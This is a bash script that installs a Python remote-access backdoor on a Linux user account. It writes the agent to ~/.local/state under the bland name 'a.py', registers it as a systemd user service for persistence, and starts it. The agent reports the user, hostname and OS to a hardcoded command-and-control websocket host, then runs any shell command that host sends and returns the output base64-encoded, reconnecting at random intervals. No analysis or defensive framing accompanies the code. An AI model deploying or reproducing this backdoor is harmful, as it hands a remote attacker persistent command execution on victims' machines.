#!/bin/bash

FILE_NAME="a.py"
FILE_PATH="$HOME/.local/state/$FILE_NAME"
SERVICE_NAME="a.service"
SERVICE_PATH="$HOME/.config/systemd/user/$SERVICE_NAME"

# Make sure the systemd user directory exists
mkdir -p "$(dirname "$SERVICE_PATH")"
mkdir -p "$(dirname "$FILE_PATH")"

cat > "$FILE_PATH" <<EOL
#!/bin/python
import asyncio
import websockets
import json
import os
import platform
import getpass
import base64
import random

def wrap(data_dict):
    json_str = json.dumps(data_dict)
    return base64.b64encode(json_str.encode()).decode()

def unwrap(b64_str):
    decoded = base64.b64decode(b64_str.encode()).decode()
    return json.loads(decoded)

async def execute_command(cmd):
    try:
        process = await asyncio.create_subprocess_shell(
            cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()
        output = stdout.decode().strip() or stderr.decode().strip()
        return output if output else "[*] Command executed (no output)"
    except Exception as e:
        return f"[!] Execution Error: {str(e)}"

async def agent_loop(uri):
    identity = f"{getpass.getuser()}@{platform.node()}"
    
    sys_info = {
        "os": platform.system(),
        "release": platform.release(),
        "arch": platform.machine(),
        "user": getpass.getuser()
    }
    
    while True:
        try:
            async with websockets.connect(uri) as websocket:
                handshake = {
                    "type": "agent",
                    "id": identity,
                    "info": sys_info
                }
                await websocket.send(wrap(handshake))

                async for message in websocket:
                    data = unwrap(message)
                    
                    if "command" in data:
                        cmd = data["command"]
                        result = await execute_command(cmd)
                        await websocket.send(wrap({
                            "type": "result",
                            "output": result
                        }))

        except Exception:
            wait_time = random.uniform(5, 45)
            await asyncio.sleep(wait_time)

if __name__ == "__main__":
    C2_URI = "wss://a-pwm4.onrender.com" 
    
    try:
        asyncio.run(agent_loop(C2_URI))
    except KeyboardInterrupt:
        pass

EOL


cat > "$SERVICE_PATH" <<EOL
[Unit]
Description=a
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=/usr/bin/env python3 $FILE_PATH
Restart=on-failure
RestartSec=10

[Install]
WantedBy=default.target
EOL

systemctl --user daemon-reload

systemctl --user enable --now "$SERVICE_NAME"
systemctl --user start "$SERVICE_NAME"

